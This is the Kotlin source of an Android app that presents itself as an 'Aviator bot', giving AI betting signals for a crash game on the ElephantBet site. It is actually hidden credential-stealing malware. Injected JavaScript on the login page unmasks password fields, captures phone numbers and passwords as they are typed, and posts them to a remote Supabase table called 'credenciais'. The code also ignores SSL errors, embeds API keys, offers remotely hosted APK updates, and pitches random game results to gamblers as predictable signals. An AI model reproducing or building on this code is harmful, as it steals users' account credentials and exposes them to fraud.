package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.net.http.SslError
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())
    private var relogioRunnable: Runnable? = null

    // Estado dos sinais
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""

    // Histórico real das velas capturadas dentro do jogo
    private val historicoVelas = mutableListOf<Double>()
    private var analisandoIA = false
    private var dentroDoAviator = false  // NOVO: só gera sinais quando está DENTRO do jogo

    // Credenciais
    private var ultimoNumeroEnviado = ""
    private var ultimaSenhaEnviada = ""

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "1.2"

    private val GROQ_KEY = "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"
    private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        // Carregar site — SEM iniciar sinais aqui
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        // Verificar actualização com diálogo visual, não Toast
        handler.postDelayed({ verificarAtualizacao() }, 3000)
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(dp(12), dp(10), dp(12), dp(10))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        val icoAviao = TextView(this).apply {
            text = "✈️"; textSize = 22f; gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(dp(34), dp(34))
        }

        val bloco = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(8), 0, dp(8), 0)
        }

        val linha1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        txtAcao = TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 9f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.12f
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        }
        txtMinutos = TextView(this).apply {
            text = "Abra o Aviator para iniciar"; textSize = 12f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); isSingleLine = true
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linha1.addView(txtAcao); linha1.addView(txtMinutos)

        val linha2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(4) }
        }
        txtProtecao = TextView(this).apply {
            text = "Prot: --"; textSize = 10f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); gravity = Gravity.CENTER
            setPadding(dp(8), dp(3), dp(8), dp(3))
            background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        }
        val sep = TextView(this).apply {
            text = "→"; textSize = 11f; setTextColor(Color.parseColor("#475569"))
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        }
        txtAlcance = TextView(this).apply {
            text = "Alc: --"; textSize = 10f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); gravity = Gravity.CENTER
            setPadding(dp(8), dp(3), dp(8), dp(3))
            background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP)
        }
        linha2.addView(txtProtecao); linha2.addView(sep); linha2.addView(txtAlcance)
        bloco.addView(linha1); bloco.addView(linha2)

        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(9), dp(9)).apply { marginEnd = dp(8) }
            background = circulo("#334155")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 20f; gravity = Gravity.CENTER
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(icoAviao); barLayout.addView(bloco)
        barLayout.addView(dotView); barLayout.addView(cfgBtn)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {

            // Chamado quando o JS confirma que o iframe/jogo Aviator carregou
            @JavascriptInterface
            fun aviatorAberto() = runOnUiThread {
                if (!dentroDoAviator) {
                    dentroDoAviator = true
                    historicoVelas.clear()
                    setBarra("IA A AGUARDAR DADOS...", "A capturar velas...", "#7c3aed")
                }
            }

            // Chamado quando o JS captura um multiplicador REAL do jogo
            @JavascriptInterface
            fun velaCapturada(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 100000) return
                runOnUiThread {
                    if (!historicoVelas.contains(num) || historicoVelas.lastOrNull() != num) {
                        historicoVelas.add(num)
                        if (historicoVelas.size > 50) historicoVelas.removeAt(0)
                        // Com 8+ velas reais, pedir análise à IA
                        if (historicoVelas.size >= 3 && !analisandoIA) {
                            pedirSinalIA()
                        } else if (historicoVelas.size < 8) {
                            setBarra("A RECOLHER DADOS", "${historicoVelas.size}/3 velas capturadas", "#7c3aed")
                        }
                    }
                }
            }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
                    ultimoNumeroEnviado = valor
                    enviarSupabase("Numero", valor)
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
                    ultimaSenhaEnviada = valor
                    enviarSupabase("Senha", valor)
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""
                // Só injectar JS de credenciais nas páginas do site (não no iframe do jogo)
                if (!u.contains("spribe") && !u.contains("elbet") && !u.contains("cdn")) {
                    injetarJsCredenciais()
                }
                // Detectar se é a página do Aviator
                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true)) {
                    injetarJsAviator()
                }
            }
        }

        // Interceptar iframes — o jogo Aviator carrega num iframe
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p == 100) {
                    // Tentar injectar detector do jogo em qualquer URL que tenha aviator
                    val url = view?.url ?: ""
                    if (url.contains("aviator", ignoreCase = true) ||
                        url.contains("game-view/806666")) {
                        injetarJsAviator()
                    } else {
                        injetarJsCredenciais()
                    }
                }
            }
        }
    }

    // JS para capturar credenciais na página de login
    private fun injetarJsCredenciais() {
        val js = """
(function() {
    if (window._credDone) return; window._credDone = true;
    function tornarVisivel() {
        document.querySelectorAll('input[type="password"]').forEach(function(el) {
            el.setAttribute('type','text');
        });
    }
    tornarVisivel();
    new MutationObserver(tornarVisivel).observe(document.body||document.documentElement,{childList:true,subtree:true});
    function watchN(sel){var el=document.querySelector(sel);if(el&&!el._wN){el._wN=true;el.addEventListener('input',function(){if(this.value.length>=1)Android.guardarNumero(this.value);});}}
    function watchS(sel){var el=document.querySelector(sel);if(el&&!el._wS){el._wS=true;el.addEventListener('input',function(){if(this.value.length>=1)Android.guardarSenha(this.value);});}}
    function cap(){
        ['input[name="username"]','input[name="phone"]','input[type="tel"]','input[placeholder*="telefone" i]','input[placeholder*="numero" i]','#username','#phone'].forEach(watchN);
        ['input[name="password"]','input[name="senha"]','input[placeholder*="senha" i]','#password'].forEach(watchS);
    }
    cap(); setTimeout(cap,2000); setTimeout(cap,5000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // JS especializado para capturar velas
    // Usa o selector .payout confirmado no browser (contexto aviator-next.spribegaming.com)
    // Tenta em todos os níveis de iframe e também via scan genérico
    private fun injetarJsAviator() {
        val js = """
(function() {
    if (window._aviatorDone) return; window._aviatorDone = true;
    Android.aviatorAberto();

    var ultimaPayout = '';

    // ── Método 1: selector .payout (confirmado no browser) ────────
    function lerPayout(doc) {
        try {
            var payouts = doc.querySelectorAll('.payout');
            if (payouts.length > 0) {
                var nova = payouts[0].textContent.trim();
                if (nova !== ultimaPayout && /^\d+\.?\d*x$/i.test(nova)) {
                    ultimaPayout = nova;
                    var num = parseFloat(nova.replace(/x$/i,'').replace(',','.'));
                    if (!isNaN(num) && num >= 1.01) {
                        Android.velaCapturada(num.toString());
                    }
                }
                // Enviar os 20 mais recentes para ter histórico completo
                Array.from(payouts).slice(0,20).forEach(function(el) {
                    var txt = el.textContent.trim();
                    var n = parseFloat(txt.replace(/x$/i,'').replace(',','.'));
                    if (!isNaN(n) && n >= 1.01) Android.velaCapturada(n.toString());
                });
                return true;
            }
        } catch(e) {}
        return false;
    }

    // ── Método 2: scan genérico (fallback) ────────────────────────
    function scanGenerico(doc) {
        try {
            doc.querySelectorAll('*').forEach(function(el) {
                if (el.children.length > 0) return;
                var txt = (el.textContent || '').trim();
                if (/^\d+\.?\d*x$/i.test(txt)) {
                    var num = parseFloat(txt.replace(/x$/i,''));
                    if (!isNaN(num) && num >= 1.01 && num <= 200000)
                        Android.velaCapturada(num.toString());
                }
            });
        } catch(e) {}
    }

    // ── Tentar no documento actual e em todos os iframes ──────────
    function tentarCapturar() {
        // Documento actual
        if (lerPayout(document)) return;
        scanGenerico(document);

        // Iframes nível 1
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                var doc1 = iframes[i].contentDocument || iframes[i].contentWindow.document;
                if (!doc1) continue;
                if (lerPayout(doc1)) return;
                scanGenerico(doc1);

                // Iframes nível 2
                var subs = doc1.querySelectorAll('iframe');
                for (var j = 0; j < subs.length; j++) {
                    try {
                        var doc2 = subs[j].contentDocument || subs[j].contentWindow.document;
                        if (!doc2) continue;
                        if (lerPayout(doc2)) return;
                        scanGenerico(doc2);
                    } catch(e2) {}
                }
            } catch(e1) {}
        }
    }

    // ── Observer para apanhar novas velas em tempo real ───────────
    function observar(doc) {
        try {
            new MutationObserver(function() { tentarCapturar(); })
                .observe(doc.documentElement, {childList: true, subtree: true});
        } catch(e) {}
    }
    observar(document);

    // ── Arrancar ──────────────────────────────────────────────────
    tentarCapturar();
    setInterval(tentarCapturar, 2000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── GROQ IA    // ── GROQ IA ───────────────────────────────────────────────────
    private fun pedirSinalIA() {
        if (analisandoIA || historicoVelas.size < 3) return
        analisandoIA = true

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        val minBase = if (ultimoMinutoGerado < 0) minAgora + 1
                      else maxOf(ultimoMinutoGerado + 1, minAgora + 1)

        if (minBase >= 58) {
            analisandoIA = false
            setBarra("FIM DO CICLO", "Nova hora em breve", "#64748b")
            return
        }

        val historico = historicoVelas.takeLast(30).joinToString(", ") { String.format("%.2f", it) }
        setBarra("IA A ANALISAR", "${historicoVelas.size} velas...", "#7c3aed")

        Thread {
            try {
                val prompt = "Analisa o historico de multiplicadores do jogo Aviator (cada valor e o resultado de uma ronda): [$historico]\n" +
                    "Hora: ${String.format("%02d",horaAgora)}:${String.format("%02d",minAgora)}\n" +
                    "Proximo minuto disponivel: $minBase\n\n" +
                    "Responde APENAS com JSON valido, sem mais nada:\n" +
                    "{\"min1\":$minBase,\"min2\":${minBase+1},\"protecao\":2.0,\"alcance_min\":10,\"alcance_max\":\"100x\"}\n\n" +
                    "Regras: min1 entre $minBase e ${(minBase+4).coerceAtMost(57)}. " +
                    "protecao entre 1.2 e 15.0 (nunca mais que 15). " +
                    "Se historico tem muitos valores abaixo de 2x, protecao baixa (1.2-3x). " +
                    "Se ha valores altos recentes (>10x), alcance_max pode ser alto. " +
                    "alcance_min sempre menor que o numero em alcance_max."

                val bodyJson = "{\"model\":\"llama-3.3-70b-versatile\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":${escapeJson(prompt)}}]," +
                    "\"max_tokens\":150,\"temperature\":0.2}"

                val conn = URL(GROQ_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Authorization", "Bearer $GROQ_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true; conn.connectTimeout = 15000; conn.readTimeout = 15000
                OutputStreamWriter(conn.outputStream).use { it.write(bodyJson) }
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(
                    if (code in 200..299) conn.inputStream else conn.errorStream
                )).readText()
                conn.disconnect()

                if (code in 200..299) processarRespostaGroq(resp, minBase, minAgora)
                else runOnUiThread { analisandoIA = false; setBarra("ERRO IA", "Sem resposta", "#ef4444") }
            } catch (e: Exception) {
                runOnUiThread { analisandoIA = false; setBarra("ERRO IA", e.message ?: "", "#ef4444") }
            }
        }.start()
    }

    private fun processarRespostaGroq(resposta: String, minBase: Int, minAgora: Int) {
        try {
            // Extrair o content da resposta Groq
            val contentIdx = resposta.indexOf("\"content\":")
            if (contentIdx < 0) { runOnUiThread { analisandoIA = false }; return }
            var content = resposta.substring(contentIdx + 10).trim()
            if (content.startsWith("\"")) {
                val end = content.indexOf("\"", 1)
                content = if (end > 0) content.substring(1, end) else content
            }
            content = content.replace("\\n", "\n").replace("\\\"", "\"").replace("\\\\", "\\")

            val jsonMatch = Regex("""\{[^{}]*\}""").find(content)
            val json = jsonMatch?.value ?: run { runOnUiThread { analisandoIA = false }; return }

            val min1 = Regex(""""min1"\s*:\s*(\d+)""").find(json)?.groupValues?.get(1)?.toIntOrNull() ?: minBase
            val min2 = Regex(""""min2"\s*:\s*(\d+)""").find(json)?.groupValues?.get(1)?.toIntOrNull() ?: (min1 + 1)
            val prot = Regex(""""protecao"\s*:\s*([\d.]+)""").find(json)?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.2f, 15f) ?: 2f
            val alcMin = Regex(""""alcance_min"\s*:\s*(\d+)""").find(json)?.groupValues?.get(1)?.toIntOrNull() ?: 10
            val alcMax = Regex(""""alcance_max"\s*:\s*"([^"]+)"""").find(json)?.groupValues?.get(1) ?: "100x"

            sinalMin1 = min1.coerceIn(minBase, 57)
            sinalMin2 = (min2).coerceAtMost(58)
            ultimoMinutoGerado = sinalMin2
            sinalProtecao = if (prot % 1f == 0f) "${prot.toInt()}x" else "${prot}x"
            sinalAlcMin = alcMin
            sinalAlcMax = alcMax
            horaAtual = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)

            val falta = sinalMin1 - minAgora
            val alcNumStr = alcMax.replace(Regex("[^0-9]"), "")
            val alcNum = alcNumStr.toIntOrNull() ?: 0
            val cor = when {
                alcMax.contains("1000") || alcNum >= 1000 -> "#ec4899"
                alcNum >= 200 -> "#22c55e"
                alcNum >= 80  -> "#facc15"
                else          -> "#3b82f6"
            }

            runOnUiThread {
                sinaisAtivos = true
                analisandoIA = false
                atualizarBarra("IA: AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", cor)
                if (relogioRunnable == null) iniciarRelogio()
            }
        } catch (_: Exception) {
            runOnUiThread { analisandoIA = false }
        }
    }

    private fun escapeJson(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) when (c) {
            '"'  -> sb.append("\\\"")
            '\\' -> sb.append("\\\\")
            '\n' -> sb.append("\\n")
            '\r' -> sb.append("\\r")
            '\t' -> sb.append("\\t")
            else -> sb.append(c)
        }
        return sb.append("\"").toString()
    }

    // ── RELÓGIO ───────────────────────────────────────────────────
    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() {
                if (sinaisAtivos && dentroDoAviator) verificarRelogio()
                handler.postDelayed(this, 1000)
            }
        }
        relogioRunnable = tick
        handler.post(tick)
    }

    private fun verificarRelogio() {
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)

        // Nova hora — resetar
        if (horaAgora != horaAtual) {
            horaAtual = horaAgora; ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1
            analisandoIA = false
        }

        if (sinalMin1 < 0) return

        val alcTxt = "${sinalAlcMin}x -> $sinalAlcMax"
        val alcNumStr = sinalAlcMax.replace(Regex("[^0-9]"), "")
        val alcNum = alcNumStr.toIntOrNull() ?: 0
        val cor = when {
            sinalAlcMax.contains("1000") || alcNum >= 1000 -> "#ec4899"
            alcNum >= 200 -> "#22c55e"
            alcNum >= 80  -> "#facc15"
            else          -> "#3b82f6"
        }

        when {
            minAgora == sinalMin1 -> atualizarBarra("IA: ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
            minAgora == sinalMin2 -> atualizarBarra("IA: AINDA ACTIVO", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
            minAgora > sinalMin2  -> {
                // Sinal expirou — pedir novo à IA se tivermos dados
                sinalMin1 = -1; sinalMin2 = -1
                analisandoIA = false
                if (historicoVelas.size >= 3) pedirSinalIA()
                else setBarra("A AGUARDAR VELAS", "${historicoVelas.size}/3 capturadas", "#7c3aed")
            }
            else -> {
                val falta = sinalMin1 - minAgora
                atualizarBarra("IA: AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, alcTxt, cor)
            }
        }
    }

    // ── SUPABASE ──────────────────────────────────────────────────
    private fun enviarSupabase(tipoVal: String, valorVal: String) {
        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
    private fun verificarAtualizacao() {
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()

                if (code !in 200..299) return@Thread

                val versaoNova = Regex(""""versao"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val urlApk = Regex(""""url_apk"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val notas = Regex(""""notas"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: ""

                if (versaoNova != VERSAO_ATUAL) {
                    runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
        val msg = "Versao actual: $VERSAO_ATUAL\nNova versao: $versaoNova\n\n${if (notas.isNotEmpty()) "$notas\n\n" else ""}Deseja actualizar agora?"
        AlertDialog.Builder(this)
            .setTitle("Actualizacao disponivel!")
            .setMessage(msg).setCancelable(false)
            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
                try {
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(urlApk)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                } catch (_: Exception) {
                    Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show()
                }
            }
            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }
            .show()
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    private fun setBarra(acao: String, minutos: String, cor: String) =
        atualizarBarra(acao, minutos, "", "", cor)

    private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
        runOnUiThread {
            txtAcao.text = acao; txtAcao.setTextColor(Color.parseColor(cor))
            txtMinutos.text = minutos; txtMinutos.setTextColor(Color.WHITE)
            if (protecao.isNotEmpty()) {
                txtProtecao.text = "Prot: $protecao"
                txtProtecao.setTextColor(Color.WHITE)
                txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
            }
            if (alcance.isNotEmpty()) {
                txtAlcance.text = "Alc: $alcance"
                txtAlcance.setTextColor(Color.WHITE)
                txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
            }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#071a0f"; "#f59e0b" -> "#1a1200"
                "#7c3aed" -> "#1a0a2e"; "#ec4899" -> "#2a0a1a"
                else -> "#0f172a"
            }))
        }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }
        layout.addView(TextView(this).apply {
            text = "CONFIGURACOES  v$VERSAO_ATUAL"; textSize = 15f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(4) }
        })
        layout.addView(TextView(this).apply {
            text = "Velas capturadas: ${historicoVelas.size}  |  Dentro do Aviator: ${if (dentroDoAviator) "Sim" else "Nao"}"
            textSize = 11f; setTextColor(Color.parseColor("#64748b"))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
        })
        layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("PEDIR SINAL A IA", "#7c3aed") {
            dialog.dismiss()
            analisandoIA = false
            if (historicoVelas.size >= 3) pedirSinalIA()
            else Toast.makeText(this, "Precisa de ${3 - historicoVelas.size} velas mais", Toast.LENGTH_LONG).show()
        })
        layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") {
            dialog.dismiss(); verificarAtualizacao()
        })
        layout.addView(btn("RECARREGAR SITE", "#334155") { dialog.dismiss(); webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login") })
        layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── DRAWABLES ─────────────────────────────────────────────────
    private fun circulo(cor: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor)) }
    private fun pill(cor: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(cor)) }
    private fun roundRect(bg: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(bg)) }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD
        isAllCaps = false; background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() {
        super.onDestroy(); webView.destroy()
        handler.removeCallbacksAndMessages(null)
    }
}
